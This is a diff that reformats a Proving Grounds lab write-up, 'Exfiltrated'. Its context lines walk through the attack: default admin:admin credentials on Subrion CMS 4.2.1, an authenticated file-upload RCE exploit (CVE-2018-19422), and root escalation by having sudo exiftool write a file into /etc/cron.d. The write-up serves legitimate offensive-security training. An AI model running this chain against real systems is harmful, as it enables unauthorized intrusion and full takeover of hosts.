@@ -1,8 +1,15 @@
+---
+title: "Exfiltrated"
+difficulty: easy
+os: linux
+description: "Exfiltrated — Offensive Security Proving Grounds easy linux writeup."
+---
+
 # Exfiltrated
 
 > Subrion CMS / sudo exiftool
 
-### Enumerating Services
+## Enumerating Services
 First, we'll perform a generic scan to identify the open ports and services running on this machine.
 ```shell
 # TCP
@@ -13,7 +20,7 @@ PORT   STATE SERVICE VERSION
 80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 ```
-### Enumerating port 80
+## Enumerating port 80
 Found Subrion CMS version 4.2.1. Default credentials admin:admin worked.
 ```shell
 # Enum dir
@@ -21,7 +28,7 @@ feroxbuster -w /usr/share/dirbuster/wordlists/directory-list-lowercase-2.3-small
 
 http://192.168.182.108/panel/
 ```
-### Initial Access
+## Initial Access
 Subrion 4.2.1 is vulnerable to authenticated file upload RCE (CVE-2018-19422).
 ```shell
 # Search exploit
@@ -42,7 +49,7 @@ python3 49876.py -u http://192.168.182.108/panel/ -l admin -p admin
 # Evidence
 cat /var/www/html/local.txt
 ```
-### Privilege Escalation
+## Privilege Escalation
 ```shell
 # Sudo check
 sudo -l
@@ -60,7 +67,7 @@ mv shell.jpg shell.php.jpg
 # GTFOBins exiftool sudo
 sudo exiftool -filename=/etc/cron.d/shell shell.php.jpg
 ```
-### Post-Exploitation
+## Post-Exploitation
 ```shell
 # Evidence
 cat /root/proof.txt
